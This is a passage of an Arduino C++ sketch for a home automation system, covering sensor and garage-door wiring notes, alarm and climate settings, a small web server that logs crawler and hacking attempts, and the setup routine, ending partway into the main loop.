// BOF preprocessor bug prevent - insert me on top of your arduino-code
// From: http://www.a-control.de/arduino-fehler/?lang=en
//#if 1
//__asm volatile ("nop");
//#endif

//----------------------------------------------------------------------------------------
//Catweazle's Arduino Automation System
//----------------------------------------------------------------------------------------
//The D_2WGApp define adds the following functionality
//- Heat pump and associated controls
//- Garage Door operations
//- Bathroom
//- Different MAC addresses
//- Different LAN IP addresses (Assigned by ADSL modem based on MAC addresses)
//- Different www ethernet ports
#define D_2WGApp
//#define D_GTMApp (not reqd)
//#define UploadDebug

//----------------------------------------------------------------------------------------
//INCLUDES
//----------------------------------------------------------------------------------------

#include <SPI.h>
#include "Ethernet.h"
#include "EthernetUdp.h"
//#include <utility\Socket.h>
#include "Socket.h"
#include <SD.h>
#include <DHT.h>
#include <EEPROM.h>
//The private.h and .cpp library files are confidential
//Remove the #include line below and the following line of code
//  l_password = PasswordHash(l_password);
//from the WebServerCheckPwd() procedure to eliminate
//password hashing from the application.
//#include <private.h>
#include "utility.h"

//----------------------------------------------------------------------------------------

//This solves "relocation truncated to fit"
//#include <avr/pgmspace.h>
//const char pad[500] PROGMEM = { 0 }; //500
//Also a trap for young players:
//If you are adding more PROGMEM to workaround it the other way, then you need to actually
//read the PROGMEM pad variable otherwise the linker doesn't include it (i.e., will have no effect).
//pad[0];

//----------------------------------------------------------------------------------------
//DATETIME INITIALISATION
//----------------------------------------------------------------------------------------

const String C_BuildDate = "18092015";  //DDMMYYYY
//Always set time in NZST and let the DaylightSaving setting operate
const String C_BuildTime = "0000";      //HHMM (24 Hour) - Set "0000" to bypass

//----------------------------------------------------------------------------------------
//USEFUL DOCUMENTATION
//----------------------------------------------------------------------------------------

//DHT11 & 22
//Front grilled front
//Pins at bottom
//Pin 1 5V
//Pin 2 Digital Signal
//Pin 3 NULL
//Pin 4 Ground

//PIR
//- with sensor cover/lamp down
//- circuitboard down
//- three pins facing you
//- take the lamp cover off to check the pin outs
//Left 5V Power
//Middle Signal
//Right Ground
//Left Adj - Sensitivity
//Right Adj - Trigger interval (hard anticlockwise is 5 sec)

/*
  //------------------------------------------------------------------------------------------------
  TWELVE WAY PLUG WIRING (SIDE)
  1	  2	  3	  4
  POWER	GROUND	OS CLI	BUZZ
  5	  6	  7	  8
  LGP	 LGS	 GCS	 LCS
  9	  10	  11	  12
  GD1	 GD2	GD OPEN	GD CLOSED

  LOUNGE CLIMATE DHT11 & PIR
    Red - 5V
    Blk - Ground
  LGS Blu - Climate Signal
  LGP Wht - PIR Signal

  ROOF SPACE CLIMATE DHT11 (TWO)
  (Above Lounge LC & Above Garage GC)
    Red - 5V
    Blk - Ground
  GCS Blu - Climate Signal
  LCS Blu - Climate Signal
  //------------------------------------------------------------------------------------------------
  TWELVE WAY PLUG WIRING (END)
  1	  2	  3	  4
  LEG      LEB     HPS     HCS
  5	  6	  7	  8
  LER      WSS     GND     HLS
  9	  10	  11	  12
  AO+	  AO-	 5V+     GCS  POWER Usage - WS+, GC+

  LE = RGB LED
  HP = Hallway PIR
  HC = Hallway Climate Sensor
  HL - Hallway Light Sensor
  WS = Alarm Wall Switch
  AO - Alarm on Flashing LED

  Hallway - RGB LED
  LER - Red - Resistor +ve
  LEG - Green - Resistor +ve
  LEB - Blue - Resistor +ve
  GND - Ground

  Hallway PIR
  5V+ - 5V Power
  HPS - PIR Signal
  GND - Ground

  Hallway Climate Sensor DHT11
  5V+ 1. Red - 5V
  HCS 2. Blue - Climate Signal
  White - NULL
  GND 4. Black -Ground

  Hallway Light Sensor
  5V+ - 5V Power
  HLS - Light Signal

  WALL SWITCH NEAR FRONT DOOR
  AO+ RED - LED pos (from pin 12)
  AO- BLK - LED neg (resistor to ground)
  5V+ WHT - Wall Switch pos (5V power)
  WSS BLU - Wall Switch signal - input to pin 11 (pin grounded)

  GARAGE CEILING CLIMATE DHT11
  5V+ 1. Red - 5V
  GCS 2. Blue - Climate Signal
    3. White - NULL
  GND 4. Black -Ground
**Beware faulty signal pin - bend pin 2 back**

  //------------------------------------------------------------------------------------------------
*/

//VCC to 5V
//GND to GND
//IN1 to Pin 9

//----------------------------------------------------------------------------------------
//APPLICATION INITIALISATION
//----------------------------------------------------------------------------------------

#ifdef D_2WGApp
#define DC_GarageOpenPin 14 //5
#define DC_GarageClosedPin 15 //6
#define DC_GarageDoorPin 16 //7
#define DC_GarageOpenLedPin 8
#define DC_GarageBuzzerPin 9
#else
#define DC_AlarmBuzzerPin 9
#endif

//Pin 10 is Ethernet Select Pin
#define DC_AlarmSwitchPin 11
#define DC_AlarmOnLEDPin 12

extern String G_Website;
//CONFIGURATION FOR 2WG
#ifdef D_2WGApp
#define       DC_SensorCountTemp 7
#define       DC_SensorCountHum 3
const String  C_SensorList[DC_SensorCountTemp]           = {
  "Outdoor", "Roof_Space", "Garage", "Lounge", "Hallway", "Front_Door", "Office"
};
const boolean C_SensorDHT11[DC_SensorCountTemp]          = {
  true, false, true, false, false, false, true
};
//Temps are upshifted 35 degrees and multiplied by 10 for internal storage purposes
const int     C_SensorMaxTemp[DC_SensorCountTemp]        = {
  800, 900, 800, 800, 800, 800, 800
}; //45,50,45,45,45,45
const int     C_SensorTempAdjust[DC_SensorCountTemp]     = {
  0, 0, 0, 0, 0, 0, 0
}; //-0.2
//int     G_SensorPrevTemp[DC_SensorCountTemp]       = {//  0,0,0,0,0,0}; //Use for Fire Alarm when temp rises rapidly
const int     C_SensorHumidityAdjust[DC_SensorCountTemp] = {
  0, 0, 0, 0, 0, 0, 0
}; //-3.9
//    int     G_PrevHumidityList[DC_SensorCountHum]      = {0,0}; //,0,0,0,0};
const byte C_RoofSpace_Sensor = 1;
const byte C_Outdoor_Sensor = 0;
const byte C_Hallway_Sensor = 4;
const byte C_Front_Door_Sensor = 5;
#else
#define       DC_SensorCountTemp 1
#define       DC_SensorCountHum 1
const String  C_SensorList[DC_SensorCountTemp]           = {
  "Office"
}; //Storeroom, Restaurant
const boolean C_SensorDHT11[DC_SensorCountTemp]          = {
  true
};
//Temps are upshifted 35 degrees and multiplied by 10 for internal storage purposes
const int     C_SensorMaxTemp[DC_SensorCountTemp]        = {
  800
}; //45,45,45,45
const int     C_SensorTempAdjust[DC_SensorCountTemp]     = {
  0
};
const int     C_SensorHumidityAdjust[DC_SensorCountTemp] = {
  0
};
#endif

#define       DC_DHT_Sensor_First_Pin 22
#define DHTPIN 22
// Uncomment whatever type you're using!
//#define DHTTYPE DHT11   // DHT 11
#define DHTTYPE DHT22   // DHT 22  (AM2302), AM2321
//#define DHTTYPE DHT21   // DHT 21 (AM2301)



unsigned long G_FireTimer = 0;
unsigned long G_DHTDelayTimer = 0;
const String C_T = "T";
int G_LoopCounter = 0;

/*Arduino board interrupts
  0 pin 2
  1 pin 3
  2 pin 21
  3 pin 20
  4 pin 19
  5 pin 18
*/
#define DC_PIRLedPin 32 //22

#ifdef D_2WGApp
#define DC_PIRCount 6
#define DC_BedroomPIRInterrupt0_2   0 //interrupt 0 on pin 2
#define DC_LoungePIRInterrupt1_3    1 //interrupt 1 on pin 3
#define DC_HallwayPIRInterrupt2_21  2 //interrupt 2 on pin 21
#define DC_GaragePIRInterrupt3_20   3 //interrupt 3 on pin 20
#define DC_PatioPIRInterrupt4_19    4 //interrupt 4 on pin 19
#define DC_BathroomPIRInterrupt5_18 5 //interrupt 5 on pin 18
#else
#define DC_PIRCount 1
#define DC_OfficePIRInterrupt0_2   0 //interrupt 0 on pin 2
#endif

struct TypePIRSensor {
  unsigned long LastDetectionTime;
  unsigned long DetectionTimer;
};

TypePIRSensor G_PIRSensorList[DC_PIRCount];
volatile boolean G_PIRInterruptSet[DC_PIRCount];
unsigned long G_PIRLEDTimer;
unsigned long G_PIREmailIntervalTimer;

#ifdef D_2WGApp
boolean G_GarageDoorActive = false; //Loads from EEPROM
boolean G_GarageOpenPinPrev;
boolean G_GarageClosedPinPrev;
unsigned long G_GarageDoorLEDFlashTimer   = 0;
unsigned long G_GarageDoorOpenTimer       = 0;
unsigned long G_GarageDoorOpenTimerTimout = 0;  //Four, then eight, then sixteen, the 32 minutes etc
unsigned long G_GarageBuzzerTimer         = 0;
unsigned long G_GarageBuzzerOneSecond     = 0;
boolean G_GarageBuzzerOn = false;
#endif

unsigned long G_AlarmOnLEDFlashTimer      = 0;
boolean G_PremisesAlarmActive = false; //Loads from EEPROM
unsigned long G_PremisesAlarmTimer = 0; //Used to suppress unnecessary multiple messages

extern boolean G_Email_Active;
extern boolean G_SendTestEmail;

unsigned long G_SocketCheckTimer = 0;
extern unsigned long G_SocketConnectionTimers[MAX_SOCK_NUM];
extern unsigned long G_SocketConnectionTimes[MAX_SOCK_NUM];

boolean G_HTML_Req_EOL;

//----------------------------------------------------------------------------------------
//GENERAL CONSTANTS
//----------------------------------------------------------------------------------------

//Timers
const unsigned long C_HalfSecond     = 500;     //half second
extern const unsigned long C_OneSecond;         //(Utility Unit)
const unsigned long C_OneMinute      = 60000;   //one minute
const unsigned long C_FourMinutes    = 240000;  //four minutes
const unsigned long C_TenMinutes     = 600000;  //ten minutes
const unsigned long C_FifteenMinutes = 900000;  //fifteen minutes
const unsigned long C_OneHour        = 3600000; //

//----------------------------------------------------------------------------------------
//GLOBAL VARIABLES/SUNDRY CONSTANTS
//----------------------------------------------------------------------------------------

//dht DHT;
DHT dht(DHTPIN, DHTTYPE);

//Create a low level server and port connection through the ADSL modem to the internet
//The EthernetServer gives us incoming client connections as they occur
#ifdef D_2WGApp
#define DC_EthernetServerPort 80
#else
#define DC_EthernetServerPort 88
#endif
EthernetServer G_EthernetServer(DC_EthernetServerPort);  //This creates the object - we begin it later and use
//extern SDClass SD;
extern boolean G_SDCardOK;

extern TypeRAMData G_RAMData[DC_RAMDataCount];
extern boolean G_RAM_Checking;
extern boolean G_RAM_Checking_Start;
extern int G_HeapMaxFreeList[DC_HeapListCount];
#ifdef HeapDebug
extern boolean G_HeapDumpPC;
#endif

//Now set up our internet connectivity
#ifdef D_2WGApp
byte G_MAC_Address[] = {
  0xDE, 0xAD, 0xBE, 0xEF, 0xFE, 0xED
}; //DEAD BEEF FEED
#else
byte G_MAC_Address[] = {
  0xFE, 0xED, 0xDE, 0xAD, 0xBE, 0xEF
}; //FEED DEAD BEEF
#endif
//We cannot begin ethernet with the fixed up address.
//It does not seem to be supported by the UDP NTP connection.
//Instead we use a DHCP ethernet startup and let the
//ADSL modem assign our required IP address based on our MAC address.

extern boolean G_EthernetOK;
extern EthernetClient G_EthernetClient; //Used for the web site and emails out
//We use this timer to control EthernetClient  processing.
//We use timer delays to allow input to arrive and
//we hold EthernetClient connections open for two second
//to allow the write buffer to clear and get to the client
//(Does not apply when sending emails)
extern unsigned long G_EthernetClientTimer;
extern boolean G_EthernetClientActive; //Set to false at startup

//Now the UDP NTP time server stuff
boolean G_UPDNTPUpdate = false;
extern boolean G_UDPNTPOK;
extern int C_UDPNTPUpdateTime; //06:27AM everyday
extern unsigned long G_NextUDPNTPUpdateTime;
extern unsigned long G_PrevMillis;

boolean G_DownThemAll_Flag = false;

//CLIMATE ARRAYS
unsigned long G_Climate_Range_Check_Timer = 0; //Every One Minute
const byte C_Climate_Chk_Minutes = 60; //One hour is the default
int  G_Periods_Per_Day = 0;
#define DC_ClimatePeriodCount 24
#define DC_WeekDayCount 7
#define DC_Temp_UpShift 35

struct TypeTempSet {
  int TempPeriodic[DC_ClimatePeriodCount];
  int TempMax[DC_WeekDayCount];
  int TempMin[DC_WeekDayCount];
};
TypeTempSet G_ArrayTemp[DC_SensorCountTemp];

struct TypeHumSet {
  int HumPeriodic[DC_ClimatePeriodCount];
  int HumMax[DC_WeekDayCount];
  int HumMin[DC_WeekDayCount];
};
TypeHumSet G_ArrayHum[DC_SensorCountHum];

long G_NextClimateUpdateTime = 0; //Time only - no date portion

#ifdef D_2WGApp
#define DC_HeatingSetCount 2 //HEAT and COOL
#define DC_HEAT 0
#define DC_COOL 1
struct TypeHeatingSet {
  long Duration; //accumulates Time() values
  long Baseline; //sum of net differences (times 10, not 35 degress upshifted)
  long Benefit;  //sum of net differences (times 10, not 35 degress upshifted)
  long Resource; //Sum of standardised temp differences
  int  ResourceCount;
};
TypeHeatingSet G_HeatingSet[DC_HeatingSetCount][DC_WeekDayCount];

byte G_AirPumpModes[DC_ClimatePeriodCount];
//unsigned long G_AirPumpSwitchingTimer = 0; //Turns the fan on and off in one/two minute intervals
boolean G_AirPumpEnabled = false;
unsigned long G_AirPumpTimer = 0; //Used to check the air pump operation every one minute
//boolean G_AirPumpOn = false;
const byte G_AirPumpPin = 45;
const byte G_BathroomLightPin = 44;
boolean G_HeatMode = false;
boolean G_CoolMode = false;
#endif

#define DC_IPAddressFieldCount 4
struct TypeCookieRecord {
  long Cookie;
  byte IPAddress[DC_IPAddressFieldCount];
  unsigned long StartTime;
  boolean Active;
};

//This is used throughout the application when we need
//to know who we are dealing with. It may be updated from
//the socket IP address to an Opera forwarded IP address
byte G_RemoteIPAddress[DC_IPAddressFieldCount] = { 0, 0, 0, 0};

//We track CWZL's IP addresses and divert html log data accordingly
byte G_CWZL_IP_Address[DC_IPAddressFieldCount] = { 0, 0, 0, 0};
//A CWZL IP address times out after ten minutes
//This matches the timeout of cookies
unsigned long G_CWZL_IP_Addr_Timer = 0;

#define DC_Cookie_Count 4
TypeCookieRecord G_CookieSet[DC_Cookie_Count];

#define DC_FailedHTMLRequestListCount 25
struct TypeHTMLRequestNode {
  byte IPAddress[DC_IPAddressFieldCount];
  char BanType[4];
  //We use a DateTime variable and not a millis() timer
  //so we can backup and restore the list
  unsigned long LastDateTime;
  byte AttemptCount;
};
TypeHTMLRequestNode G_FailedHTMLRequestList[DC_FailedHTMLRequestListCount];

struct TIPAddress {
  byte IPField[DC_IPAddressFieldCount];
};

const byte G_RecentIPAddressCount = 4;
TIPAddress G_Recent_IPAddresses[G_RecentIPAddressCount];

struct TypeAlarmTimer {
  byte DayOfWeekNum; //Mon = 1, Sun = 7
  unsigned long StartTime;
  boolean StartActioned;
  unsigned long EndTime;
  boolean EndActioned;
};

#define DC_AlarmTimerCount 20
TypeAlarmTimer G_AlarmTimerList[DC_AlarmTimerCount];

#define DC_PageNameCount 50
unsigned int G_PageNames[DC_PageNameCount];

//#define DC_StatisticsCount 29
extern unsigned int G_StatActvMth[DC_StatisticsCount];
extern unsigned int G_StatActvDay[DC_StatisticsCount];

const int G_CrawlerCount = 20;
unsigned int G_StatCrwlMth[G_CrawlerCount];
unsigned int G_StatCrwlDay[G_CrawlerCount];
const String G_WebCrawlers[G_CrawlerCount] = { //26/08/15 ROGERBOT
  "BAIDUSPIDER", "BINGBOT", "GOOGLEBOT", "YANDEXBOT", "AHREFSBOT", "SPBOT", "SLURP", "DUCKDUCKGO", "FAVICON", "MJ12BOT",
  "DOTBOT", "BLEXBOT", "XOVIBOT", "MASSCAN", "MORFEUS", "SURVEYBOT", "WOTBOX", "PROBETHENET", "SPINN3R", "BOT"
};
const int G_CrawlerIPCount = 2;
const String G_WebCrawlerIPs[G_CrawlerIPCount]     = {"220.181.108.", "123.125.71."};
const String G_WebCrawlerIPNames[G_CrawlerIPCount] = {"BAIDU", "BAIDU"};

extern PCacheItem G_CacheHead;
extern PCacheItem G_CacheTail;
extern byte G_CacheCount;
extern int G_CacheSize;
//These flags have no security or access implications.
//They merely redirect html request log data to alternate log files
//so it each easier for CWZL to analyse remaining public HTML log data
//and manage external access to the system.
extern boolean G_Hack_Flag; //Redirects hack HTML data to the HACKLOGS
extern int G_Web_Crawler_Index; //Redirects web crawler HTML data to the CRAWLER Logs
boolean G_Mobile_Flag; //Transmits mobile friendly web pages
//We assume it is CWZL if the CWZL startup string provided OR a valid password login occurs
extern boolean G_CWZ_HTML_Req_Flag; //Redirects Catweazle HTML data to the CTWLREQU Logs
boolean G_XSS_Hack_Flag;

extern PHTMLParm G_HTMLParmListHead;
//We capture current heap stats at the end of each loop iteration
//When we have closed all files, there is no EthernetClient connection
//and the Cache and HTMLParmList have been released then the Free Heap
//space should be NULL. (There is still be some constant global strings
//occupying the first portion of the heap.
int  G_Loop_Heap_Size;
int  G_Loop_Free_Heap_Size;
byte G_Loop_Free_Heap_Count;

byte G_Prev_ICON_Rip[] = { 0, 0, 0, 0}; //Used to minimise ICON downloads
byte G_Prev_ICON_Rip_Count = 0;

extern int16_t recv(SOCKET s, uint8_t * buf, int16_t len); // Receive data (TCP)

//----------------------------------------------------------------------------------------

boolean G_Start = true;

#ifdef D_2WGApp
const int GC_RedPin = 5;
const int GC_GreenPin = 6;
const int GC_BluePin = 7;

byte G_LED_Red = 0;
byte G_LED_Green = 0;
byte G_LED_Blue = 0;

unsigned long G_LEDNightLightTimer;
unsigned long G_PIRLightTimer;
unsigned long G_BathroomLightTimer;
const int GC_VoltagePin = 1;
const int GC_LightPin = 0;
const int GC_LowLightLevel = 50;
#endif

//----------------------------------------------------------------------------------------
//START UP INITIALISATION
//----------------------------------------------------------------------------------------

void setup() {
  delay(50); //Give W5100 enough reset time

#ifdef D_2WGApp
  G_Website = "2WG";
#else
  G_Website = "GTM";
#endif

  //INSERT WRITE STATEMENTS FOR NEW EEPROM VALUES HERE.
  //REMOVE THEM AFTER STARTING THE APPLICATION ONCE.
  //THE FOLLOWING TWO (WHICH ARE COMMENTED OUT OF THE CODE) ARE EXAMPLES
  //EPSW(E_FILEDELETE_239,"FILEDELETE");
  //EPSW(E_FNAME_240,"FNAME");

  //EPSW(E_Hacker_326,"Hacker");
  //EPSW(E_Catweazle_327,"Catweazle");
  //EPSW(E_Public_328,"Public");
  //EPSW(E_applicationslzip_329,"application/zip");
  //EPSW(E_MOBILE_330,"MOBILE");
  //EPSW(E_REFERERco_331,"REFERER:");
  //EPSW(E_ARDUINO_332,"ARDUINO");

  //initialise serial port
  Serial.begin(9600);
  Serial.println(F("Setup"));

#ifdef D_2WGApp
  //Initialise RGB LED Pins
  pinMode(GC_RedPin, OUTPUT);
  pinMode(GC_GreenPin, OUTPUT);
  pinMode(GC_BluePin, OUTPUT);
  FlashRGBLED();
#endif

  //initialise our cache
  G_CacheHead = NULL;
  G_CacheTail = NULL;
  G_CacheCount = 0;
  G_CacheSize = 0;

  G_HTMLParmListHead = NULL;

  C_UDPNTPUpdateTime =  26875; //06:27AM
  for (byte l_pir_init = 0; l_pir_init < DC_PIRCount; l_pir_init++) {
    G_PIRSensorList[l_pir_init].LastDetectionTime = 0;
    G_PIRSensorList[l_pir_init].DetectionTimer = millis();
    G_PIRInterruptSet[l_pir_init] = false;
  }

  //Initialise the connected socket arrays
  G_SocketCheckTimer = millis();
  for (byte l_sock = 0; l_sock < MAX_SOCK_NUM; l_sock++) {
    G_SocketConnectionTimers[l_sock] = 0;
    G_SocketConnectionTimes[l_sock] = 0;
  }

  //Initialise recent IP Address List
  for (byte l_ip_addr = 0; l_ip_addr < G_RecentIPAddressCount; l_ip_addr++) {
    for (byte l_field = 0; l_field < DC_IPAddressFieldCount; l_field++) {
      G_Recent_IPAddresses[l_ip_addr].IPField[l_field] = 0;
    }
  }

  //Initialise the SPI pins
  pinMode(DC_SDCardSSPin, OUTPUT);     // 4
  pinMode(DC_EthernetSSPin, OUTPUT);   //10
  pinMode(DC_SPIHardwareSSPin, OUTPUT); //53

  //Before we can write activity records we need to be sure
  //that an SD card is available and we have set the clock.
  SPIDeviceSelect(DC_SDCardSSPin); //Pin 4 now LOW, pins 10 & 53 now HIGH
  G_SDCardOK = SD.begin(DC_SDCardSSPin);

  //Serial.println(F("SD Begin"));
  SPIDeviceSelect(DC_EthernetSSPin); //Enable Ethernet on SPI (Disable others)

  ResetSRAMStatistics();

  if (EPSR(E_Alarm_Default_3) == C_T)  G_PremisesAlarmActive = true;
  else                                 G_PremisesAlarmActive = false;

#ifdef D_2WGApp
  if (EPSR(E_Garage_Door_Default_9) == C_T)  G_GarageDoorActive = true;
  else                                       G_GarageDoorActive = false;
#endif

  if (EPSR(E_Email_Default_4) == C_T)        G_Email_Active = true;
  else                                       G_Email_Active = false;

#ifdef D_2WGApp
  if (EPSR(E_Heating_Mode_10) == C_T) G_HeatMode = true;
  else                                G_HeatMode = false;
  if (EPSR(E_Cooling_Mode_11) == C_T) G_CoolMode = true;
  else                                G_CoolMode = false;

  //Initialise the Garage
  //Initialise garage door operating pin
  //If is a NO switch - so HIGH will not create
  //an electrical short on the door controller
  pinMode(DC_GarageDoorPin, OUTPUT);
  digitalWrite(DC_GarageDoorPin, HIGH);

  //Both these pins are LOW when the garage is closed
  //They are both HIGH when the garage is open
  pinMode(DC_GarageOpenPin, INPUT);
  pinMode(DC_GarageClosedPin, INPUT);

  //Initialise the LED to off
  pinMode(DC_GarageOpenLedPin, OUTPUT);
  digitalWrite(DC_GarageOpenLedPin, LOW);

  //Initialise the Buzzer to off
  pinMode(DC_GarageBuzzerPin, OUTPUT);
  digitalWrite(DC_GarageBuzzerPin, LOW);
#else
  pinMode(DC_AlarmBuzzerPin, OUTPUT);
  digitalWrite(DC_AlarmBuzzerPin, LOW);
#endif

  //initialise the alarm switch pin
  pinMode(DC_AlarmSwitchPin, INPUT);

  //initialise the Alarm On LED to off
  pinMode(DC_AlarmOnLEDPin, OUTPUT);
  digitalWrite(DC_AlarmOnLEDPin, LOW);

#ifdef D_2WGApp
  //Initialise the Bathroom Light pin
  pinMode(G_BathroomLightPin, OUTPUT);
  digitalWrite(G_BathroomLightPin, HIGH); //Relay and its LED OFF

  //Initialise the Air Pump pin
  pinMode(G_AirPumpPin, OUTPUT);
  digitalWrite(G_AirPumpPin, HIGH); //Relay and its LED OFF
  G_AirPumpEnabled = false; //OFF

  G_GarageOpenPinPrev   = digitalRead(DC_GarageOpenPin);
  G_GarageClosedPinPrev = digitalRead(DC_GarageClosedPin);
#endif

  //Initialise the physical interrupt pins
  //This may not be necessary
#ifdef D_2WGApp
  pinMode(2, INPUT);
  pinMode(3, INPUT);
  pinMode(18, INPUT);
  pinMode(19, INPUT);
  pinMode(20, INPUT);
  pinMode(21, INPUT);
#else
  pinMode(2, INPUT);
#endif

  //initialise the PIR LED to HIGH - it times out after 30 secs
  pinMode(DC_PIRLedPin, OUTPUT);
  G_PIRLEDTimer = millis();
  digitalWrite(DC_PIRLedPin, HIGH);

  //Initialise a two minute general PIR delay
  //This will give the sensors time to settle down
  //Should eliminate extraneous emails
  G_PIREmailIntervalTimer = millis() + 60000; //normally one minute - force two minutes at start

  //Initialise Ethernet connectivity
  //Serial.println(F("Ethernet Start"));
  SPIDeviceSelect(DC_EthernetSSPin); //Enable Ethernet on SPI (Disable others)
  //Now start the ethernet operation.
  //We pass the mac address out and rely on DHCP to assign our IP address
  //2WG - 192.168.2.80
  //GTM - 192.168.1.88
  G_EthernetOK = Ethernet.begin(G_MAC_Address);
  delay(1000); //Give the ethernet connectivity a chance to settle down
  //Start the low level port connection
  //We must start the server AFTER the Ethernet begin
  //The EthernetServer gives us incoming client connections
  G_EthernetServer.begin();

  //Serial.println(F("UDP Time"));
  if (C_BuildTime == EPSR(E_0000_17)) {
    G_UDPNTPOK = ReadTimeUDP(); //Will error out if G_EthernetOk == false
    if (EPSR(E_Daylight_Saving_5) == C_T) SetDaylightSavingTime(true);
    else                                  SetDaylightSavingTime(false);
    if (G_UDPNTPOK)
      G_NextUDPNTPUpdateTime = Date() + 100000 + C_UDPNTPUpdateTime; //tomorrow @ 6:27am
    else //In a power cut the system starts faster than the ADSL modem so we
      //will need to retry UDPNTP later - so we try again in five minutes
      G_NextUDPNTPUpdateTime = Now() + 347; //(100000 / 24 / 12) - try again in five minutes
    //
  }

  //Manually initialise the time if required
  boolean l_manual_time = false;
  if ((G_EthernetOK == false) || (G_UDPNTPOK == false) || (C_BuildTime != EPSR(E_0000_17))) {
    unsigned long l_date = DateExtract(C_BuildDate); //DDMMYYYY
    unsigned long l_time = TimeExtract(C_BuildTime); //HHMM (24 Hour)
    SetStartDatetime(l_date + l_time);
    l_manual_time = true;
    G_NextUDPNTPUpdateTime = 0; //No UPDNTP updates
  }

  InitMemoryArrays(C_Climate_Chk_Minutes, true, false); //clear seven day history, don't record activity

  boolean l_backup_load = false; //D
  l_backup_load = LoadRecentMemoryBackupFile();

  //Force all the recorded cookie sets to be inactive
  for (byte l_index = 0; l_index < DC_Cookie_Count; l_index ++)
    G_CookieSet[l_index].Active = false;
  //

  //Now we communicate the start up details
  TwoWayCommsSPICSC2(EPSR(E_START_UP_12)); //,l_email_init);
  TwoWayCommsSPICSC2(EPSR(E_Serial_Start_13)); //,l_email_init);

  if (G_SDCardOK) TwoWayCommsSPICSC2(EPSR(E_SD_Card_OK_15)); //,l_email_init);
  else            TwoWayCommsSPICSC2(EPSR(E_SD_Card_Failure_16)); //,l_email_init);

  if (G_EthernetOK) TwoWayCommsSPICSC2(EPSR(E_Ethernet_OK_14)); //,l_email_init);
  else              TwoWayCommsSPICSC2(Message(M_Ethernet_Failure_1)); //,l_email_init);

  if ((G_EthernetOK) && (C_BuildTime == EPSR(E_0000_17))) {
    if (G_UDPNTPOK) TwoWayCommsSPICSC2(EPSR(E_UDP_NTP_OK_18)); //,l_email_init);
    else            TwoWayCommsSPICSC2(Message(M_UDP_NTP_Failure_2)); //,l_email_init);
  }
  if (l_backup_load) TwoWayCommsSPICSC2(EPSR(E_Backup_Reload_OK_19)); //,l_email_init);
  else               TwoWayCommsSPICSC2(Message(M_Backup_Reload_Failure_3)); //,l_email_init);

  if (l_manual_time) TwoWayCommsSPICSC2(Message(M_Build_Time_Initialisation_4)); //,l_email_init);

  if (G_PremisesAlarmActive) TwoWayCommsSPICSC2(EPSR(E_Alarm_Active_20)); //,l_email_init);
  else                       TwoWayCommsSPICSC2(EPSR(E_Alarm_Disabled_21)); //,l_email_init);

#ifdef D_2WGApp
  if (G_GarageDoorActive) TwoWayCommsSPICSC2(EPSR(E_Garage_Door_Web_Active_22)); //,l_email_init);
  else                    TwoWayCommsSPICSC2(EPSR(E_Garage_Door_Web_Disabled_23)); //,l_email_init);

  //Perform initialisation for an open garage door
  if (digitalRead(DC_GarageClosedPin) == LOW) {
    TwoWayCommsSPICSC2(EPSR(E_Garage_Door_is_Open_65)); //,l_email_init);
    digitalWrite(DC_GarageOpenLedPin, HIGH); //Door Open LED
    G_GarageDoorOpenTimer = millis(); //Will activate close operation or email
    G_GarageDoorOpenTimerTimout = C_FourMinutes;
  }
#endif

  SPIDeviceSelect(DC_SDCardSSPin);
  if (LoadAlarmTimesSPIBA())
    TwoWayCommsSPICSC2(EPSR(E_Alarm_Times_Loaded_167)); //,l_email_init);
  //
  SPIDeviceSelect(DC_EthernetSSPin);

  if (EPSR(E_RAM_Checking_8) == C_T) {
    G_RAM_Checking = true;
    G_RAM_Checking_Start = true;
    TwoWayCommsSPICSC2(EPSR(E_RAM_Checking_is_On_168));
  }
  else {
    G_RAM_Checking = false;
    TwoWayCommsSPICSC2(EPSR(E_RAM_Checking_is_Off_169)); //,l_email_init);
  }

  TwoWayCommsSPICSC2(EPSR(E_Free_RAM__24) + String(freeRam())); //,l_email_init);
  //TwoWayCommsSPICSC2(String(EPSR(E_DHT_Library_Version__273) + String(DHT_LIB_VERSION))); //,l_email_init);
  TwoWayCommsSPICSC2(String(EPSR(E_SD_Card_File_Count__84) + String(PrintRootDirFileCountSPISE()))); //,l_email_init);
  G_PrevMillis = millis();

  SPIDeviceSelect(DC_EthernetSSPin); //Ensure default ethernet on SPI (Disable others)

  //Activate the interrupt - interrups just set a flag
  //We process interrupts inline via a call from loop()
  //This ensure we don't send an interrupt email in the middle of any other process
  //including sending an email about something else
#ifdef D_2WGApp
  attachInterrupt(DC_BedroomPIRInterrupt0_2  , BedroomPIRDetection0_2, RISING); //Interrupt 0 on pin 2
  attachInterrupt(DC_LoungePIRInterrupt1_3   , LoungePIRDetection1_3, RISING);  //Interrupt 1 on pin 3
  attachInterrupt(DC_HallwayPIRInterrupt2_21 , HallwayPIRDetection2_21, RISING); //Interrupt 2 on pin 21
  attachInterrupt(DC_GaragePIRInterrupt3_20  , GaragePIRDetection3_20, RISING); //Interrupt 3 on pin 20
  attachInterrupt(DC_PatioPIRInterrupt4_19   , PatioPIRDetection4_19, RISING);  //Interrupt 4 on pin 19
  attachInterrupt(DC_BathroomPIRInterrupt5_18, BathroomPIRDetection5_18, RISING); //Interrupt 5 on pin 18
#else
  attachInterrupt(DC_OfficePIRInterrupt0_2  , OfficePIRDetection0_2, RISING);   //Interrupt 0 on pin 2
#endif

  AnalyseFreeHeap(G_Loop_Free_Heap_Size, G_Loop_Free_Heap_Count, NULL);
  TwoWayCommsSPICSC2(EPSR(E_Free_Heap_Sizeco__247) + String(G_Loop_Free_Heap_Size));
  TwoWayCommsSPICSC2(EPSR(E_Free_Heap_Countco__248) + String(G_Loop_Free_Heap_Count));
  TwoWayCommsSPICSC2(EPSR(E_Start_Up_Complete_29)); //,l_email_init);

  //This procedure can assign random application page numbers and reset
  //them at midnight every day. But the functionality is disabled - we
  //now used fixed web page numbers.
  ResetAllWebPageNumbers();

  Serial.println(F("Setup End"));

}//setup

//----------------------------------------------------------------------------------------
//MAIN PROCESSING LOOP
//----------------------------------------------------------------------------------------

void loop() {
  //The loop is iterated continuously while the application is running.
  //We make extensive use of sub procedures to minimise SRAM requirements.
  //We have no global Strings subject to update so heap memory does not fragment.

  //In an attempt to maximise application response times we:
  //- process high priority tasks every iteration
  //- process low priority tasks every 20 iterations

  G_LoopCounter++;
  if (G_LoopCounter == 20)
    G_LoopCounter = 0;
  //

  if (G_LoopCounter == 1)
    CheckSRAMCheckingStart();
  //
  CheckMillisRollover();      //after about 55 days

#ifdef D_2WGApp
  GarageDoorProcess();        //Check if opening or closing
#endif
  /*
    If the garage door buzzer is operating we suspend other operations
     to allow the buzzer to operate correctly in one second beeps.
